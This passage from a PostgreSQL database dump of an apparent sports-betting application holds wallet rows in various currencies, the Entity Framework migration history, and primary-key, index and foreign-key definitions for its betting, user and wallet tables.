a8bcf08a-9c9d-487e-9798-c805b26563a6	8c09f1af-1515-4495-837c-6674da6d2be3	2025-11-14 22:26:05.749981-06	2025-11-14 22:34:25.664407-06	957.24	USD	42.76	USD	1000.00	USD	0.00	USD	0.00	USD
5e3ece3e-a5a9-4168-99d6-b7b756a45dc4	ce40595a-26f8-4659-a937-82dee702c2a8	2025-11-14 22:26:05.749981-06	2025-11-14 22:34:36.010393-06	954.22	USD	45.78	USD	1000.00	USD	0.00	USD	0.00	USD
2014a4a4-5df9-4688-b07a-1fcf54258fe5	bafd125b-cb44-47f1-9a25-93b69e7483ef	2025-11-14 22:26:05.749981-06	2025-11-14 22:35:46.336879-06	921.84	NOK	78.16	NOK	1000.00	NOK	0.00	NOK	0.00	NOK
0e8273f6-262b-4055-b382-80ad917d2e54	c47e3e35-7877-4802-8a02-02843973a1d4	2025-11-14 22:26:05.749981-06	2025-11-14 22:35:51.5103-06	950.68	CAD	49.32	CAD	1000.00	CAD	0.00	CAD	0.00	CAD
69263511-77c0-406c-bd4d-280baf42a421	9d7aad08-481e-4dfb-aaaa-3bec95827c10	2025-11-14 22:26:05.749981-06	2025-11-14 22:37:06.992926-06	956.06	CHF	43.94	CHF	1000.00	CHF	0.00	CHF	0.00	CHF
1322e6ce-403c-4216-9b0d-0931733ea679	d079c970-6efb-4cf8-a8e1-baef89819fcc	2025-11-14 22:26:05.749981-06	2025-11-14 22:37:17.311093-06	947.57	SEK	52.43	SEK	1000.00	SEK	0.00	SEK	0.00	SEK
ca8eafd5-b5b7-4782-bba7-74a82927f9c1	2a414a5c-f857-44fd-ae76-e3260c9382be	2025-11-14 15:48:11.909712-06	2025-11-14 17:34:17.621839-06	1000000502.21	USD	300.00	USD	1000005824.96	USD	6050.00	USD	1027.25	USD
0b143518-b6c5-43fd-aa5e-ef98addcb7aa	1ef7db4b-d2b3-49ee-a985-ef4034978689	2025-11-14 22:21:29.110626-06	2025-11-14 22:26:05.883189-06	541.47	USD	458.53	USD	1000.00	USD	0.00	USD	0.00	USD
bf8dfa43-8d86-4ad9-9a30-b8f7c80d2a03	e13aba69-091f-423e-a362-22d6dd26c14e	2025-11-14 22:21:29.110626-06	2025-11-14 22:26:05.992024-06	693.69	USD	306.31	USD	1000.00	USD	0.00	USD	0.00	USD
baba4be9-2481-45d3-aff8-d50cae5d418b	b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	2025-11-14 22:26:05.749981-06	2025-11-14 22:30:52.774152-06	966.02	EUR	33.98	EUR	1000.00	EUR	0.00	EUR	0.00	EUR
81c0aabf-4904-4f88-a5fd-5691a9d843bc	838d44ed-4447-480a-91c6-5011bb11369f	2025-11-14 22:26:05.749981-06	2025-11-14 22:30:52.995584-06	966.32	STR	33.68	STR	1000.00	STR	0.00	STR	0.00	STR
00cf29af-dbff-46a9-8a2d-4a174102ae2d	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	2025-11-14 22:26:05.749981-06	2025-11-14 22:30:53.214261-06	945.66	STR	54.34	STR	1000.00	STR	0.00	STR	0.00	STR
fdd3205d-cbcf-49be-a095-54e11cb35a90	d029350a-0055-40fd-961b-07c65072613a	2025-11-14 22:26:05.749981-06	2025-11-14 22:30:53.435455-06	944.18	USD	55.82	USD	1000.00	USD	0.00	USD	0.00	USD
86d2ccdb-b429-4ed7-82cb-2c7aeff46c46	647ff2c3-4dd7-4778-b390-bd6c0f32dff0	2025-11-14 22:26:05.749981-06	2025-11-14 22:33:30.831918-06	916.01	USD	83.99	USD	1000.00	USD	0.00	USD	0.00	USD
664ed49a-bc69-483d-b65f-01274085967e	e6535c73-b40c-462d-8faa-aab8cf8e6f01	2025-11-14 22:26:05.749981-06	2025-11-14 22:33:30.973413-06	939.39	USD	60.61	USD	1000.00	USD	0.00	USD	0.00	USD
d22f337e-74d9-48d1-b833-b92d2a5dc416	7e58c576-a98a-4973-8835-1b542aad3459	2025-11-14 22:26:05.749981-06	2025-11-14 22:33:31.113718-06	913.58	USD	86.42	USD	1000.00	USD	0.00	USD	0.00	USD
c684dd1f-1b3b-4779-b79e-410b29f6ddbe	4a4c880b-41ed-4713-965f-de25d4d341cd	2025-11-14 22:26:05.749981-06	2025-11-14 22:33:31.253905-06	910.84	GBP	89.16	GBP	1000.00	GBP	0.00	GBP	0.00	GBP
56caae51-2b9a-4c56-884e-1e62edd5043f	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	2025-11-14 22:26:05.749981-06	2025-11-14 22:34:30.844928-06	954.86	USD	45.14	USD	1000.00	USD	0.00	USD	0.00	USD
30b48d19-ceb7-4d30-b2b0-de67270ced6c	afab4f82-de2b-40c7-8000-0410e828e2b9	2025-11-14 22:26:05.749981-06	2025-11-14 22:35:41.174083-06	937.48	USD	62.52	USD	1000.00	USD	0.00	USD	0.00	USD
7eb18004-31df-4f7f-a1c5-1cb017ca3eec	91966209-ca29-439d-bea5-ea8b3a0dc2b0	2025-11-14 22:26:05.749981-06	2025-11-14 22:30:52.565837-06	883.54	GBP	116.46	GBP	1000.00	GBP	0.00	GBP	0.00	GBP
cd636ba2-6d6a-4c1a-97e7-7fc2a6a766fb	b70d5a3c-c776-4795-9caf-f83e60b822a4	2025-11-14 22:26:05.749981-06	2025-11-14 22:35:56.670524-06	988.04	JPY	11.96	JPY	1000.00	JPY	0.00	JPY	0.00	JPY
d71de114-b6ab-4594-9e94-61f4be8c128c	6d9f9662-688c-487c-8301-95625d842b7e	2025-11-14 22:26:05.749981-06	2025-11-14 22:36:01.834047-06	935.80	AUD	64.20	AUD	1000.00	AUD	0.00	AUD	0.00	AUD
ff115264-ea11-4678-ab2d-6b8bc7dab905	db4ef871-1da4-4506-be39-f5d22ba1b4f6	2025-11-14 22:26:05.749981-06	2025-11-14 22:37:12.147923-06	946.83	NZD	53.17	NZD	1000.00	NZD	0.00	NZD	0.00	NZD
\.


--
-- Data for Name: __EFMigrationsHistory; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."__EFMigrationsHistory" ("MigrationId", "ProductVersion") FROM stdin;
20251114214729_InitialCreate	9.0.1
20251114232847_UseXminForRowVersion	9.0.1
20251114233827_AddDatabaseConstraints	9.0.1
20251115001151_MakeRowVersionNullable	9.0.1
20251115014637_AddRefreshTokens	9.0.1
20251115024332_AddEmailVerification	9.0.1
20251115024606_AddPasswordReset	9.0.1
20251115033749_AddUserRole	9.0.1
\.


--
-- Name: BetSelections PK_BetSelections; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."BetSelections"
    ADD CONSTRAINT "PK_BetSelections" PRIMARY KEY ("Id");


--
-- Name: Bets PK_Bets; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Bets"
    ADD CONSTRAINT "PK_Bets" PRIMARY KEY ("Id");


--
-- Name: Events PK_Events; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Events"
    ADD CONSTRAINT "PK_Events" PRIMARY KEY ("Id");


--
-- Name: Leagues PK_Leagues; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Leagues"
    ADD CONSTRAINT "PK_Leagues" PRIMARY KEY ("Id");


--
-- Name: LineLocks PK_LineLocks; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."LineLocks"
    ADD CONSTRAINT "PK_LineLocks" PRIMARY KEY ("Id");


--
-- Name: Markets PK_Markets; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Markets"
    ADD CONSTRAINT "PK_Markets" PRIMARY KEY ("Id");


--
-- Name: Outcomes PK_Outcomes; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Outcomes"
    ADD CONSTRAINT "PK_Outcomes" PRIMARY KEY ("Id");


--
-- Name: RefreshTokens PK_RefreshTokens; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."RefreshTokens"
    ADD CONSTRAINT "PK_RefreshTokens" PRIMARY KEY ("Id");


--
-- Name: Sports PK_Sports; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Sports"
    ADD CONSTRAINT "PK_Sports" PRIMARY KEY ("Id");


--
-- Name: Teams PK_Teams; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Teams"
    ADD CONSTRAINT "PK_Teams" PRIMARY KEY ("Id");


--
-- Name: Transactions PK_Transactions; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Transactions"
    ADD CONSTRAINT "PK_Transactions" PRIMARY KEY ("Id");


--
-- Name: Users PK_Users; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Users"
    ADD CONSTRAINT "PK_Users" PRIMARY KEY ("Id");


--
-- Name: Wallets PK_Wallets; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Wallets"
    ADD CONSTRAINT "PK_Wallets" PRIMARY KEY ("Id");


--
-- Name: __EFMigrationsHistory PK___EFMigrationsHistory; Type: CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."__EFMigrationsHistory"
    ADD CONSTRAINT "PK___EFMigrationsHistory" PRIMARY KEY ("MigrationId");


--
-- Name: IX_BetSelections_BetId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_BetId" ON public."BetSelections" USING btree ("BetId");


--
-- Name: IX_BetSelections_BetId1; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_BetId1" ON public."BetSelections" USING btree ("BetId1");


--
-- Name: IX_BetSelections_EventId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_EventId" ON public."BetSelections" USING btree ("EventId");


--
-- Name: IX_BetSelections_MarketId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_MarketId" ON public."BetSelections" USING btree ("MarketId");


--
-- Name: IX_BetSelections_OutcomeId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_OutcomeId" ON public."BetSelections" USING btree ("OutcomeId");


--
-- Name: IX_BetSelections_Result; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_BetSelections_Result" ON public."BetSelections" USING btree ("Result");


--
-- Name: IX_Bets_LineLockId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Bets_LineLockId" ON public."Bets" USING btree ("LineLockId");


--
-- Name: IX_Bets_PlacedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Bets_PlacedAt" ON public."Bets" USING btree ("PlacedAt");


--
-- Name: IX_Bets_Status; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Bets_Status" ON public."Bets" USING btree ("Status");


--
-- Name: IX_Bets_TicketNumber; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Bets_TicketNumber" ON public."Bets" USING btree ("TicketNumber");


--
-- Name: IX_Bets_UserId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Bets_UserId" ON public."Bets" USING btree ("UserId");


--
-- Name: IX_Bets_UserId_PlacedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Bets_UserId_PlacedAt" ON public."Bets" USING btree ("UserId", "PlacedAt");


--
-- Name: IX_Events_AwayTeamId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_AwayTeamId" ON public."Events" USING btree ("AwayTeamId");


--
-- Name: IX_Events_HomeTeamId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_HomeTeamId" ON public."Events" USING btree ("HomeTeamId");


--
-- Name: IX_Events_LeagueId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_LeagueId" ON public."Events" USING btree ("LeagueId");


--
-- Name: IX_Events_LeagueId_ScheduledStartTime; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_LeagueId_ScheduledStartTime" ON public."Events" USING btree ("LeagueId", "ScheduledStartTime");


--
-- Name: IX_Events_ScheduledStartTime; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_ScheduledStartTime" ON public."Events" USING btree ("ScheduledStartTime");


--
-- Name: IX_Events_Status; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Events_Status" ON public."Events" USING btree ("Status");


--
-- Name: IX_Leagues_Code; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Leagues_Code" ON public."Leagues" USING btree ("Code");


--
-- Name: IX_Leagues_SportId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Leagues_SportId" ON public."Leagues" USING btree ("SportId");


--
-- Name: IX_Leagues_SportId1; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Leagues_SportId1" ON public."Leagues" USING btree ("SportId1");


--
-- Name: IX_LineLocks_AssociatedBetId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_AssociatedBetId" ON public."LineLocks" USING btree ("AssociatedBetId");


--
-- Name: IX_LineLocks_EventId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_EventId" ON public."LineLocks" USING btree ("EventId");


--
-- Name: IX_LineLocks_ExpirationTime; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_ExpirationTime" ON public."LineLocks" USING btree ("ExpirationTime");


--
-- Name: IX_LineLocks_LockNumber; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_LineLocks_LockNumber" ON public."LineLocks" USING btree ("LockNumber");


--
-- Name: IX_LineLocks_Status; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_Status" ON public."LineLocks" USING btree ("Status");


--
-- Name: IX_LineLocks_UserId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_UserId" ON public."LineLocks" USING btree ("UserId");


--
-- Name: IX_LineLocks_UserId_Status; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_LineLocks_UserId_Status" ON public."LineLocks" USING btree ("UserId", "Status");


--
-- Name: IX_Markets_EventId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Markets_EventId" ON public."Markets" USING btree ("EventId");


--
-- Name: IX_Markets_EventId1; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Markets_EventId1" ON public."Markets" USING btree ("EventId1");


--
-- Name: IX_Markets_EventId_Type; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Markets_EventId_Type" ON public."Markets" USING btree ("EventId", "Type");


--
-- Name: IX_Markets_IsOpen; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Markets_IsOpen" ON public."Markets" USING btree ("IsOpen");


--
-- Name: IX_Markets_Type; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Markets_Type" ON public."Markets" USING btree ("Type");


--
-- Name: IX_Outcomes_IsVoid; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Outcomes_IsVoid" ON public."Outcomes" USING btree ("IsVoid");


--
-- Name: IX_Outcomes_IsWinner; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Outcomes_IsWinner" ON public."Outcomes" USING btree ("IsWinner");


--
-- Name: IX_Outcomes_MarketId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Outcomes_MarketId" ON public."Outcomes" USING btree ("MarketId");


--
-- Name: IX_Outcomes_MarketId1; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Outcomes_MarketId1" ON public."Outcomes" USING btree ("MarketId1");


--
-- Name: IX_RefreshTokens_ExpiresAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_RefreshTokens_ExpiresAt" ON public."RefreshTokens" USING btree ("ExpiresAt");


--
-- Name: IX_RefreshTokens_Token; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_RefreshTokens_Token" ON public."RefreshTokens" USING btree ("Token");


--
-- Name: IX_RefreshTokens_UserId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_RefreshTokens_UserId" ON public."RefreshTokens" USING btree ("UserId");


--
-- Name: IX_Sports_Code; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Sports_Code" ON public."Sports" USING btree ("Code");


--
-- Name: IX_Sports_Name; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Sports_Name" ON public."Sports" USING btree ("Name");


--
-- Name: IX_Teams_Code; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Teams_Code" ON public."Teams" USING btree ("Code");


--
-- Name: IX_Teams_LeagueId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Teams_LeagueId" ON public."Teams" USING btree ("LeagueId");


--
-- Name: IX_Teams_LeagueId1; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Teams_LeagueId1" ON public."Teams" USING btree ("LeagueId1");


--
-- Name: IX_Teams_Name; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Teams_Name" ON public."Teams" USING btree ("Name");


--
-- Name: IX_Transactions_CreatedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_CreatedAt" ON public."Transactions" USING btree ("CreatedAt");


--
-- Name: IX_Transactions_ReferenceId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_ReferenceId" ON public."Transactions" USING btree ("ReferenceId");


--
-- Name: IX_Transactions_Status; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_Status" ON public."Transactions" USING btree ("Status");


--
-- Name: IX_Transactions_Type; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_Type" ON public."Transactions" USING btree ("Type");


--
-- Name: IX_Transactions_UserId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_UserId" ON public."Transactions" USING btree ("UserId");


--
-- Name: IX_Transactions_UserId_CreatedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Transactions_UserId_CreatedAt" ON public."Transactions" USING btree ("UserId", "CreatedAt");


--
-- Name: IX_Users_CreatedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Users_CreatedAt" ON public."Users" USING btree ("CreatedAt");


--
-- Name: IX_Users_Email; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Users_Email" ON public."Users" USING btree ("Email");


--
-- Name: IX_Users_Username; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Users_Username" ON public."Users" USING btree ("Username");


--
-- Name: IX_Wallets_LastUpdatedAt; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE INDEX "IX_Wallets_LastUpdatedAt" ON public."Wallets" USING btree ("LastUpdatedAt");


--
-- Name: IX_Wallets_UserId; Type: INDEX; Schema: public; Owner: calebwilliams
--

CREATE UNIQUE INDEX "IX_Wallets_UserId" ON public."Wallets" USING btree ("UserId");


--
-- Name: BetSelections FK_BetSelections_Bets_BetId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."BetSelections"
    ADD CONSTRAINT "FK_BetSelections_Bets_BetId" FOREIGN KEY ("BetId") REFERENCES public."Bets"("Id") ON DELETE CASCADE;


--
-- Name: BetSelections FK_BetSelections_Bets_BetId1; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."BetSelections"
    ADD CONSTRAINT "FK_BetSelections_Bets_BetId1" FOREIGN KEY ("BetId1") REFERENCES public."Bets"("Id");


--
-- Name: Bets FK_Bets_Users_UserId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Bets"
    ADD CONSTRAINT "FK_Bets_Users_UserId" FOREIGN KEY ("UserId") REFERENCES public."Users"("Id") ON DELETE CASCADE;


--
-- Name: Events FK_Events_Teams_AwayTeamId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Events"
    ADD CONSTRAINT "FK_Events_Teams_AwayTeamId" FOREIGN KEY ("AwayTeamId") REFERENCES public."Teams"("Id") ON DELETE RESTRICT;


--
-- Name: Events FK_Events_Teams_HomeTeamId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Events"
    ADD CONSTRAINT "FK_Events_Teams_HomeTeamId" FOREIGN KEY ("HomeTeamId") REFERENCES public."Teams"("Id") ON DELETE RESTRICT;


--
-- Name: Leagues FK_Leagues_Sports_SportId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Leagues"
    ADD CONSTRAINT "FK_Leagues_Sports_SportId" FOREIGN KEY ("SportId") REFERENCES public."Sports"("Id") ON DELETE CASCADE;


--
-- Name: Leagues FK_Leagues_Sports_SportId1; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Leagues"
    ADD CONSTRAINT "FK_Leagues_Sports_SportId1" FOREIGN KEY ("SportId1") REFERENCES public."Sports"("Id");


--
-- Name: LineLocks FK_LineLocks_Users_UserId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."LineLocks"
    ADD CONSTRAINT "FK_LineLocks_Users_UserId" FOREIGN KEY ("UserId") REFERENCES public."Users"("Id") ON DELETE CASCADE;


--
-- Name: Markets FK_Markets_Events_EventId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Markets"
    ADD CONSTRAINT "FK_Markets_Events_EventId" FOREIGN KEY ("EventId") REFERENCES public."Events"("Id") ON DELETE CASCADE;


--
-- Name: Markets FK_Markets_Events_EventId1; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Markets"
    ADD CONSTRAINT "FK_Markets_Events_EventId1" FOREIGN KEY ("EventId1") REFERENCES public."Events"("Id");


--
-- Name: Outcomes FK_Outcomes_Markets_MarketId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Outcomes"
    ADD CONSTRAINT "FK_Outcomes_Markets_MarketId" FOREIGN KEY ("MarketId") REFERENCES public."Markets"("Id") ON DELETE CASCADE;


--
-- Name: Outcomes FK_Outcomes_Markets_MarketId1; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Outcomes"
    ADD CONSTRAINT "FK_Outcomes_Markets_MarketId1" FOREIGN KEY ("MarketId1") REFERENCES public."Markets"("Id");


--
-- Name: RefreshTokens FK_RefreshTokens_Users_UserId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."RefreshTokens"
    ADD CONSTRAINT "FK_RefreshTokens_Users_UserId" FOREIGN KEY ("UserId") REFERENCES public."Users"("Id") ON DELETE CASCADE;


--
-- Name: Teams FK_Teams_Leagues_LeagueId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Teams"
    ADD CONSTRAINT "FK_Teams_Leagues_LeagueId" FOREIGN KEY ("LeagueId") REFERENCES public."Leagues"("Id") ON DELETE CASCADE;


--
-- Name: Teams FK_Teams_Leagues_LeagueId1; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Teams"
    ADD CONSTRAINT "FK_Teams_Leagues_LeagueId1" FOREIGN KEY ("LeagueId1") REFERENCES public."Leagues"("Id");


--
-- Name: Transactions FK_Transactions_Users_UserId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Transactions"
    ADD CONSTRAINT "FK_Transactions_Users_UserId" FOREIGN KEY ("UserId") REFERENCES public."Users"("Id") ON DELETE CASCADE;


--
-- Name: Wallets FK_Wallets_Users_UserId; Type: FK CONSTRAINT; Schema: public; Owner: calebwilliams
--

ALTER TABLE ONLY public."Wallets"
    ADD CONSTRAINT "FK_Wallets_Users_UserId" FOREIGN KEY ("UserId") REFERENCES public."Users"("Id") ON DELETE CASCADE;


--
-- PostgreSQL database dump complete
--

\unrestrict QKkrMnIlzUN3iQFCS7SVPqNpdXnx1pKM9uLty0qz3a3tm3jQscjqjHgVAtsSh4G

